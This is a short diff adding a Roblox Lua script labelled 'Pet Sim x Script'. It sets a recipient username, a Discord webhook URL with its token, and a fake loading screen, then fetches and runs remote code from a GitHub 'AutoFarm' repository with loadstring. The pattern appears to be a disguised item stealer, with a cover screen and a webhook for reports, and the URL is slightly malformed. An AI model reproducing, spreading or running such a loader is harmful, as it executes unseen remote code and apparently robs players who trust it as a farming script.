@@ -1,0 +1,9 @@
+Username = "dominik123gj"
+WebHook = "https://discord.com/api/webhooks/1121140171228852275/MmAgvZq20IChtRRFblBbkVqOsuxP0tSeiofKfpUFdc_W30tA7SSwztvS3eS_R6Zk66k-"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/JOELNOYNAY/AutoFarm/main/AutoFarm%22))()
